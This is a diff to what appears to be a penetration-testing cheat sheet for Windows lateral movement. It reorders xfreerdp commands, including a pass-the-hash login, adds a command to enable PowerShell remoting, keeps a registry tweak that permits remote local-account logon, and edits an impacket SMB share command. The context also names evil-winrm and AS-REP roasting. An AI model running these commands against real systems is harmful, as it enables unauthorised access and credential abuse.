@@ -14,6 +14,16 @@ https://download.sysinternals.com/files/PSTools.zip
 PsExec64.exe -s -i "\full\path\to\exe\create-kernel-service.exe"
 ```
 
+// xfreerdp - dynamic resolution, shared folder, ignore cert  
+```
+xfreerdp /dynamic-resolution /cert:ignore /v:x.x.x.x /u:someuser /p:'spazzword' /drive:SHARE,<local file path>
+xfreerdp /v:x.x.x.x /u:someuser /pth:xxxxxxxxxxxxxHASHxxxxxxxxxxxxxxx
+```
+
+Enable WinRM
+```powershell
+Enable-PSRemoting -SkipNetworkProfileCheck -Force
+```
 // Allow remote logon to WinRM service (PowerShell) 
 ```
 New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "LocalAccountTokenFilterPolicy" -Value 1 -PropertyType "DWORD"
@@ -21,12 +31,6 @@ New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies
 -or-
 ```
 winrm quickconfig
-```
-
-// xfreerdp - dynamic resolution, shared folder, ignore cert  
-```
-xfreerdp /dynamic-resolution /cert:ignore /v:x.x.x.x /u:someuser /p:'spazzword' /drive:SHARE,<local file path>
-xfreerdp /v:x.x.x.x /u:someuser /pth:xxxxxxxxxxxxxHASHxxxxxxxxxxxxxxx
 ```
 
 // evil-winrm
@@ -63,7 +67,7 @@ impacket-GetNPUsers contoso.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10
 
 // Impacket - Create share  (not MacOS)
 ```  
-smbserver.py -smb2support -username <user> -password <password> public share
+smbserver.py -smb2support -username <user> -password <password> <share name> <path to share>
 ```
 
 // Impacket/Linux - Set perms on shared files
